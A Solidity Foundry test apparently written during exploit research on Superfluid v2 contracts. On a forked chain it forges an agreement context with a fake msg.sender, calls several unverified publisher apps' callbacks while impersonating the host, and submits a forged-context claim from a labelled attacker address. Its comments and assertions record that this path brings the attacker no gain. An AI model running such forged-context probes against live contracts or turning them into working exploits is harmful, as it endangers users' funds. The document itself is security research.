// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IPublisherCallbackApp {
    function afterAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

/// @title Attempt17
/// @notice Hypothesis: the remaining live unverified publisher apps are still
///         old REX/Stream-style SuperApps whose IDA `afterAgreementUpdated()`
///         path is a no-op, even though their runtimes still contain
///         `callAgreementWithContext`, `transfer`, or `approve` helpers.
/// @dev Verified REX helper calls live at
///      `sources/ch5_superfluid_v2/0xcab28480ab5c1e133e9b7fc67e030b8dcc2a1d24_rextwowaymaticmarket/src/contracts/REXMarket.sol:528-539`
///      and `:598-610`, but the actual `afterAgreementUpdated()` callback
///      returns `_ctx` unless `_isCFAv1(_agreementClass)` at `:771-803`.
/// @dev Verified StreamExchange helper calls live at
///      `sources/ch5_superfluid_v2/0x0a70fbb45bc8c70fb94d8678b92686bb69dea3c3_streamexchange/src/contracts/StreamExchangeHelper.sol:252-263`
///      and `:301-323`, but `afterAgreementUpdated()` still returns `_ctx`
///      unless the callback is CFA input-token traffic at
///      `sources/ch5_superfluid_v2/0x0a70fbb45bc8c70fb94d8678b92686bb69dea3c3_streamexchange/src/contracts/StreamExchange.sol:316-330`.
/// @dev Nested `callAgreementWithContext()` also overwrites `context.msgSender`
///      with `msg.sender` at
///      `sources/ch5_superfluid_v2/0x513b7c5c6b7d8b21a14d6d5536878fb0a803bef4_superfluid_host_impl_fork_patch1/src/contracts/superfluid/Superfluid.sol:676-699`,
///      so even a reached helper would execute as the app, not the forged
///      victim.
contract Attempt17 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    uint256 constant FORK_BLOCK = 27_039_967;

    address constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA_ADDR = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;

    address constant TOKEN_WBTCX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address constant TOKEN_RICX = 0x263026E7e53DBFDce5ae55Ade22493f828922965;
    address constant TOKEN_DAIX = 0x27e1e4E6BC79D93032abef01025811B7E4727e85;
    address constant TOKEN_USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;

    address constant PUBLISHER_5970 = 0x5970Acd9e2Cb09089FE61f4D0fEc1ae0E959bbDe;
    address constant PUBLISHER_E007 = 0xE0073786618b886aA1aa44Df103850a227ADe9ae;
    address constant PUBLISHER_E0B7 = 0xe0B7907FA4B759FA4cB201F0E02E16374Bc523fd;
    address constant PUBLISHER_E6A1 = 0xE6A190D5c70C357be7804C4f31911dde8228FDC5;
    address constant PUBLISHER_F415 = 0xF415CD95999c94ad9dFCB29B71908329D635E5Fe;

    address constant SUB_5970 = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    address constant SUB_E007 = 0x66177BDEc367f638be98e53d1493EE043d20b4a2;

    uint32 constant INDEX_5970 = 0;
    uint32 constant INDEX_E007 = 3;

    address constant FORGED_MSG_SENDER = 0x1111111111111111111111111111111111111111;

    ISuperfluidHost constant HOST = ISuperfluidHost(HOST_ADDR);
    IInstantDistributionAgreementV1 constant IDA = IInstantDistributionAgreementV1(IDA_ADDR);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(IDA_ADDR, "IDA");
        vm.label(PUBLISHER_5970, "UnverifiedPublisher5970");
        vm.label(PUBLISHER_E007, "UnverifiedPublisherE007");
        vm.label(PUBLISHER_E0B7, "UnverifiedPublisherE0B7");
        vm.label(PUBLISHER_E6A1, "UnverifiedPublisherE6A1");
        vm.label(PUBLISHER_F415, "UnverifiedPublisherF415");
    }

    function test_unverified_live_publishers_keep_ida_after_update_as_noop() public {
        bytes memory fakeCtx = _buildForgedClaimCtx();
        uint256 nativeBefore = ATTACKER.balance;

        console.log("[start] attacker native:", nativeBefore);

        _assertAfterUpdatedNoop(PUBLISHER_5970, TOKEN_WBTCX, fakeCtx);
        _assertAfterUpdatedNoop(PUBLISHER_E007, TOKEN_RICX, fakeCtx);
        _assertAfterUpdatedNoop(PUBLISHER_E0B7, TOKEN_WBTCX, fakeCtx);
        _assertAfterUpdatedNoop(PUBLISHER_E6A1, TOKEN_DAIX, fakeCtx);
        _assertAfterUpdatedNoop(PUBLISHER_F415, TOKEN_USDCX, fakeCtx);

        (, bool approvedBefore,, uint256 pendingBefore) =
            IDA.getSubscription(TOKEN_RICX, PUBLISHER_E007, INDEX_E007, SUB_E007);

        console.log("[pre] e007 approved:", approvedBefore);
        console.log("[pre] e007 pending:", pendingBefore);

        assertFalse(approvedBefore, "e007 tuple must stay on the unapproved claim path");
        assertGt(pendingBefore, 0, "e007 tuple must stay claimable");

        bytes memory inner = abi.encodeCall(
            IDA.claim,
            (TOKEN_RICX, PUBLISHER_E007, INDEX_E007, SUB_E007, fakeCtx)
        );
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));

        vm.prank(ATTACKER);
        HOST.callAgreement(IDA, outer, new bytes(0));

        (, bool approvedAfter,, uint256 pendingAfter) =
            IDA.getSubscription(TOKEN_RICX, PUBLISHER_E007, INDEX_E007, SUB_E007);
        uint256 nativeAfter = ATTACKER.balance;

        console.log("[post] e007 approved:", approvedAfter);
        console.log("[post] e007 pending:", pendingAfter);
        console.log("[end] attacker native:", nativeAfter);

        assertEq(pendingAfter, 0, "live unverified claim should still settle the target tuple");
        assertEq(nativeAfter, nativeBefore, "unverified publisher branch still yields no attacker native gain");
    }

    function _assertAfterUpdatedNoop(address publisher, address token, bytes memory fakeCtx) internal {
        bytes memory payload = abi.encodeWithSelector(
            IPublisherCallbackApp.afterAgreementUpdated.selector,
            token,
            IDA_ADDR,
            bytes32(0),
            bytes(""),
            bytes(""),
            fakeCtx
        );

        vm.recordLogs();
        vm.prank(HOST_ADDR);
        (bool ok, bytes memory returnedData) = publisher.call(payload);
        Vm.Log[] memory entries = vm.getRecordedLogs();

        console.log("[probe] publisher:", publisher);
        console.log("[probe] logs:", entries.length);

        assertTrue(ok, "unverified afterAgreementUpdated should not revert on the IDA path");

        bytes memory returnedCtx = abi.decode(returnedData, (bytes));
        assertEq(returnedCtx, fakeCtx, "IDA afterAgreementUpdated should return the incoming ctx unchanged");
        assertEq(entries.length, 0, "IDA afterAgreementUpdated should not emit nested-operation logs");
    }

    function _buildForgedClaimCtx() internal view returns (bytes memory) {
        ContextUtils.Context memory context = ContextUtils.buildContext(
            FORGED_MSG_SENDER,
            IInstantDistributionAgreementV1.claim.selector,
            ""
        );
        return ContextUtils.encodeContext(context);
    }
}
